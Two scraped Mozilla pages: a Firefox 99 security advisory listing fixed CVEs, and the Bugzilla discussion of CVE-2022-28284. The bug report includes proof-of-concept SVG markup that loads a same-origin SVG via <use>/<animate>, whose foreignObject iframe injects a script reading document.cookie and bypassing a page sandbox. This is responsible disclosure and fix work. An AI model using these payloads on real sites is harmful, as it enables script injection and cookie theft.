=== Content from www.mozilla.org_e6c176ce_20250114_183541.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2022-13

## Security Vulnerabilities fixed in Firefox 99

Announced
April 5, 2022
Impact
high
Products
Firefox
Fixed in

* Firefox 99

#### [#CVE-2022-1097: Use-after-free in NSSToken objects](#CVE-2022-1097)

Reporter
Randell Jesup
Impact
high
##### Description

`NSSToken` objects were referenced via direct points, and could have been accessed in an unsafe way on different threads, leading to a use-after-free and potentially exploitable crash.

##### References

* [Bug 1745667](https://bugzilla.mozilla.org/show_bug.cgi?id=1745667)

#### [#CVE-2022-28281: Out of bounds write due to unexpected WebAuthN Extensions](#CVE-2022-28281)

Reporter
Axel '0vercl0k' Souchet
Impact
high
##### Description

If a compromised content process sent an unexpected number of WebAuthN Extensions in a Register command to the parent process, an out of bounds write would have occurred leading to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1755621](https://bugzilla.mozilla.org/show_bug.cgi?id=1755621)

#### [#CVE-2022-28282: Use-after-free in DocumentL10n::TranslateDocument](#CVE-2022-28282)

Reporter
Kirin
Impact
moderate
##### Description

By using a link with `rel="localization"` a use-after-free could have been triggered by destroying an object during JavaScript execution and then referencing the object through a freed pointer, leading to a potentially exploitable crash.

##### References

* [Bug 1751609](https://bugzilla.mozilla.org/show_bug.cgi?id=1751609)

#### [#CVE-2022-28283: Missing security checks for fetching sourceMapURL](#CVE-2022-28283)

Reporter
Gijs
Impact
moderate
##### Description

The sourceMapURL feature in devtools was missing security checks that would have allowed a webpage to attempt to include local files or other files that should have been inaccessible.

##### References

* [Bug 1754066](https://bugzilla.mozilla.org/show_bug.cgi?id=1754066)

#### [#CVE-2022-28284: Script could be executed via svg's use element](#CVE-2022-28284)

Reporter
Leo Balter
Impact
moderate
##### Description

SVG's `<use>` element could have been used to load unexpected content that could have executed script in certain circumstances. While the specification seems to allow this, other browsers do not, and web developers relied on this property for script security so gecko's implementation was aligned with theirs.

##### References

* [Bug 1754522](https://bugzilla.mozilla.org/show_bug.cgi?id=1754522)

#### [#CVE-2022-28285: Incorrect AliasSet used in JIT Codegen](#CVE-2022-28285)

Reporter
Lukas Bernhard
Impact
moderate
##### Description

When generating the assembly code for `MLoadTypedArrayElementHole`, an incorrect AliasSet was used. In conjunction with another vulnerability this could have been used for an out of bounds memory read.

##### References

* [Bug 1756957](https://bugzilla.mozilla.org/show_bug.cgi?id=1756957)

#### [#CVE-2022-28286: iframe contents could be rendered outside the border](#CVE-2022-28286)

Reporter
prada960808
Impact
low
##### Description

Due to a layout change, iframe contents could have been rendered outside of its border. This could have led to user confusion or spoofing attacks.

##### References

* [Bug 1735265](https://bugzilla.mozilla.org/show_bug.cgi?id=1735265)

#### [#CVE-2022-28287: Text Selection could crash Firefox](#CVE-2022-28287)

Reporter
Aryan Sinha
Impact
low
##### Description

In unusual circumstances, selecting text could cause text selection caching to behave incorrectly, leading to a crash.

##### References

* [Bug 1741515](https://bugzilla.mozilla.org/show_bug.cgi?id=1741515)

#### [#CVE-2022-24713: Denial of Service via complex regular expressions](#CVE-2022-24713)

Reporter
Addison Crump and Jan-Erik Rediger
Impact
low
##### Description

The rust regex crate did not properly prevent crafted regular expressions from taking an arbitrary amount of time during parsing. If an attacker was able to supply input to this crate, they could have caused a denial of service in the browser.

##### References

* [Bug 1758509](https://bugzilla.mozilla.org/show_bug.cgi?id=1758509)

#### [#CVE-2022-28289: Memory safety bugs fixed in Firefox 99 and Firefox ESR 91.8](#CVE-2022-28289)

Reporter
Mozilla developers
Impact
high
##### Description

Mozilla developers and community members Nika Layzell, Andrew McCreight, Gabriele Svelto, and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 98 and Firefox ESR 91.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 99 and Firefox ESR 91.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1663508%2C1744525%2C1753508%2C1757476%2C1757805%2C1758549%2C1758776)

#### [#CVE-2022-28288: Memory safety bugs fixed in Firefox 99](#CVE-2022-28288)

Reporter
Mozilla developers
Impact
moderate
##### Description

Mozilla developers and community members Randell Jesup, Sebastian Hengst, and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 98. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 99](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1746415%2C1746495%2C1746500%2C1747282%2C1748759%2C1749056%2C1749786%2C1751679%2C1752120%2C1756010%2C1756017%2C1757213%2C1757258%2C1757427)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_d9c52784_20250114_183539.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1754522)
* [XML](/show_bug.cgi?ctype=xml&id=1754522)

Closed
[Bug 1754522](/show_bug.cgi?id=1754522)
(CVE-2022-28284)

Opened 3 years ago
Closed 3 years ago

# XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element

## Categories

### (Core :: SVG, defect)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=SVG#SVG)

SVG
▾

Core :: SVG

Issues with the layout or rendering of SVG content and interacting with the SVG DOM.

Example bugs:

* SVG marker can not be clipped with clip-path
* x position adjustments of SVG vertical text on a path moves in the wrong direction

Specifications covered:

* SVG

[See Open Bugs in This Component](/buglist.cgi?product=Core&component=SVG&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=SVG&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=SVG)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

--

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

99 Branch

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Priority | --- |
| --- | --- |
| a11y-review | --- |
| Webcompat Score | --- |
| Accessibility Severity | --- |
| Performance Impact | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr91 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr91&o1=equals&v1=wontfix) |
| firefox97 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox97&o1=equals&v1=wontfix) |
| firefox98 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox98&o1=equals&v1=wontfix) |
| firefox99 | --- | [fixed](/buglist.cgi?f1=cf_status_firefox99&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr91 |  | wontfix |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox97 |  | wontfix |
| firefox98 |  | wontfix |
| firefox99 |  | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: lbalter, Assigned: emilio)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/1d91d22a4892f16f744b31fd4286144e?d=mm&size=40)  [emilio](/user_profile?user_id=546716)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/7971d37dbf6921da0524e135d684f374?d=mm&size=40)  [lbalter](/user_profile?user_id=693871)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](extensions/Gravatar/web/default.jpg)  [jwatt](/user_profile?user_id=32767)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

13 people

## References

### (Regressed 2 open bugs)

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

[1776206](/show_bug.cgi?id=1776206 "NEW - SVG file mask not being loaded with <use>"), [1779834](/show_bug.cgi?id=1779834 "NEW - <animate> nodes not present when embedding SVGs via <use href>")

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[CVE-2022-34475](/show_bug.cgi?id=1757210 "VERIFIED FIXED - Bypass of HTML Sanitizer API using same origin use element"), [1912763](/show_bug.cgi?id=1912763 "RESOLVED INVALID - Cross-document script can run in <use> element, through event handlers, when loaded through a same-origin (but cross-document) SVG file")

[1806964](/show_bug.cgi?id=1806964 "RESOLVED FIXED - Restrict SVG `<use>` to prevent usage of `data:` URLs")

## Details

### (Keywords: sec-moderate, Whiteboard: [keep hidden while 1757210 is][contributes to sec-high website vulns][adv-main99+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2022-28284

[Keywords:](/describekeywords.cgi)

[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[keep hidden while 1757210 is][contributes to sec-high website vulns][adv-main99+]

QA Whiteboard:

[post-critsmash-triage]

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [RyanVM](/user_profile?user_id=75935) | [in-testsuite](#a1734864_75935 "3 years ago") | + |
| --- | --- | --- |
| [RyanVM](/user_profile?user_id=75935) | in-testsuite | + |
| --- | --- | --- |
| [mboldan](/user_profile?user_id=551058) | [qe-verify](#a2837305_551058 "3 years ago") | - |
| --- | --- | --- |
| [mboldan](/user_profile?user_id=551058) | qe-verify | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (2 files)

| [Bug 1754522 - Limit cross-document content loadable via <svg:use>. r=jwatt,longsonr](/attachment.cgi?id=9263182)  [3 years ago](#c7)  [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)   48 bytes, text/x-phabricator-request |  | [Details](/attachment.cgi?id=9263182&action=edit) | [Review](/attachment.cgi?id=9263182) |
| --- | --- | --- |
| [advisory.txt](/attachment.cgi?id=9269938)  [3 years ago](#c26)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   388 bytes, text/plain |  | [Details](/attachment.cgi?id=9269938&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Leo Balter](/user_profile?user_id=693871)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1754522#c0)• 3 years ago |
|  | |

User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36

Steps to reproduce:

Example: <https://glitch.com/edit/#!/notch-wood-soap?path=index.html%3A49%3A0>

Firefox allows JS injection from SVG's loaded from <use> and <animate> attributes.

```
    <svg>
      <use>
        <animate attributename="href" keytimes="0;0;1" values="foo;/xss.svg#xss;bar"></animate>
      </use>
    </svg>

      <svg>
        <use>
          <animate attributename="href" from="/xss.svg#xss" to=""></animate>
        </use>
      </svg>

      <svg>
        <use>
          <animate attributename="href" dur="1s" to="/xss.svg#xss"></animate>
        </use>
      </svg>

```

xss.svg:

```
<svg id="xss" xmlns="http://www.w3.org/2000/svg">;
<foreignObject>
<iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;body&gt;&lt;script src=/test2.js&gt;&lt;/script&gt;"></iframe>;
</foreignObject>
</svg>

```

test2.js:

```
var l = document.createElement("h1");
l.innerText = document.cookie;
l.id="mycookies";
document.body.appendChild(l);

alert(`cookies! ${document.getElementById("mycookies").innerText}`);

```

Actual results:

Firefox loads xss.svg and then the iframe injecting test2.js from srcdoc, printing w/ cookies set in document.cookies.

Expected results:

Chrome and Safari will load the xss.svg without injecting test2 from the iframe's srcdoc.

This currently bypasses our sandboxing framework and gives access to `top.document`.

Note: this concerns would be mitigated the by replacing usage of iframes with ShadowRealms. Although, the injection still persists.

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1754522#a2459_159069)• 3 years ago |

Group: firefox-core-security → layout-core-securityComponent: Untriaged → SVGProduct: Firefox → Core

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Assignee |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1754522#c1)• 3 years ago |
|  | |

So it doesn't happen if there's no `animate`? As in, just `<use href="">` correctly restricts the load? That seems bad.

|  | [Theodore](/user_profile?user_id=700985) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1754522#c2)• 3 years ago |
|  | |

@Emilio (In reply to Emilio Cobos Álvarez (:emilio) from [comment #1](/show_bug.cgi?id=1754522#c1 "RESOLVED FIXED - XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element"))

> So it doesn't happen if there's no `animate`? As in, just `<use href="">` correctly restricts the load? That seems bad.

It happens with just use element too:

Examples

```
 <svg>
  <use href="/xss.svg#xss"></use>
 </svg>
</template>```

```<template>
 <svg>
  <use xlink:href="/xss.svg#xss"></use>
 </svg>
</template>```

```

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1754522#a13140_1689)• 3 years ago |

Status: UNCONFIRMED → NEWEver confirmed: trueFlags: needinfo?(jwatt)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1754522#c3)• 3 years ago |
|  | |

What kind of restriction are Chrome/Safari enforcing? Are we mis-interpreting the spec, or have they added restrictions on top?

Keywords: [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)Whiteboard: [contributes to sec-high website vulns]

|  | [Theodore](/user_profile?user_id=700985) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1754522#c4)• 3 years ago |
|  | |

Is secure static mode (<https://www.w3.org/TR/SVG/conform.html#secure-static-mode>) enabled? Seems like it's loading external references from the SVG file. Does that make sense? Thank you.

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1754522#c5)• 3 years ago |
|  | |

(In reply to Theodore from [comment #4](/show_bug.cgi?id=1754522#c4 "RESOLVED FIXED - XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element"))

> Is secure static mode (<https://www.w3.org/TR/SVG/conform.html#secure-static-mode>) enabled? Seems like it's loading external references from the SVG file. Does that make sense? Thank you.

Not quite the same. I think the difference here is that Blink and WebKit just allow a subset of elements inside `<svg:use>`:

* <https://webkit-search.igalia.com/webkit/rev/3ed885ee5156c7ea2fdd381e531f5e6cadf10569/Source/WebCore/svg/SVGUseElement.cpp#182-204>
* [https://source.chromium.org/chromium/chromium/src/+/main:third\_party/blink/renderer/core/svg/svg\_use\_element.cc;l=255;drc=c0ad59c4619f654a036e6aa18602ba84262472c2](https://source.chromium.org/chromium/chromium/src/%2B/main%3Athird_party/blink/renderer/core/svg/svg_use_element.cc;l=255;drc=c0ad59c4619f654a036e6aa18602ba84262472c2)

|  | [Robert Longson [:longsonr]](/user_profile?user_id=218550) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1754522#c6)• 3 years ago |
|  | |

As far as I recall use references are restricted to same site only.

See also [bug 1477214](/show_bug.cgi?id=1477214 "NEW")

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Assignee |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1754522#c7)• 3 years ago |
|  | |

Attached file
[Bug 1754522 - Limit cross-document content loadable via <svg:use>. r=jwatt,longsonr](attachment.cgi?id=9263182)
— [Details](attachment.cgi?id=9263182&action=edit)

It seems Blink / WebKit run this even if in the same document, but it

seems less-potentially-breaking to restrict this to the cross-document

case.

Though at least on the test-case it seems it's loading from the same

origin, which is a bit dubious to restrict...

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1754522#c8)• 3 years ago |
|  | |

So we could do something like the patch I just submitted, but I did a bit of testing and indeed this is limited only to same-origin, test-case:

<http://crisal.io/tmp/svg-use-external.html>

So how is this a security risk? It seems that this is only an issue if the resource is loaded from the same origin.

Flags: needinfo?(lbalter)

|  | [Theodore](/user_profile?user_id=700985) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1754522#c9)• 3 years ago |
|  | |

(In reply to Emilio Cobos Álvarez (:emilio) from [comment #8](/show_bug.cgi?id=1754522#c8 "RESOLVED FIXED - XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element"))

> So we could do something like the patch I just submitted, but I did a bit of testing and indeed this is limited only to same-origin, test-case:
>
> <http://crisal.io/tmp/svg-use-external.html>
>
> So how is this a security risk? It seems that this is only an issue if the resource is loaded from the same origin.

It bypasses our sandbox and allows malicious users access to the raw document; it can access all the cookies outside of the sandbox, etc.

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Assignee |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1754522#c10)• 3 years ago |
|  | |

Well but you're loading same-origin content, and that content contains `<script>` and `<foreignObject>` so it's not unexpected that scripts can run?

|  | [Theodore](/user_profile?user_id=700985) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1754522#c11)• 3 years ago |
|  | |

(In reply to Emilio Cobos Álvarez (:emilio) from [comment #10](/show_bug.cgi?id=1754522#c10 "RESOLVED FIXED - XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element"))

> Well but you're loading same-origin content, and that content contains `<script>` and `<foreignObject>` so it's not unexpected that scripts can run?

Yes. Not unexpected. But there's multiple sandboxes on the page. Cookies are shared by the sandboxes on the page. If one sandbox found a way to get the page cookies, that'll be a security break.

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Assignee |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1754522#c12)• 3 years ago |
|  | |

I don't feel super-strongly either way. Perhaps we should just do [comment 7](/show_bug.cgi?id=1754522#c7 "RESOLVED FIXED - XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element") for compat with other engines. Jonathan / Robert / Daniel, do you have any strong opinions either way?

Flags: needinfo?(longsonr)Flags: needinfo?(dholbert)

|  | [Robert Longson [:longsonr]](/user_profile?user_id=218550) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1754522#c13)• 3 years ago |
|  | |

It seems a shame to block foreignObject from use but if that's compatible with other engines I suppose that's OK.

I really don't see any cross site scripting here because the use elements targets have always had to be same site (although not same document).

Flags: needinfo?(longsonr)

|  | [Leo Balter](/user_profile?user_id=693871)  Reporter |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1754522#c14)• 3 years ago |
|  | |

This link is almost the same of the original example, but it changes the url to test2.js for a cross-domain one.

<https://glitch.com/edit/#!/spectrum-juniper-radio?path=xss.svg%3A1%3A0>

```
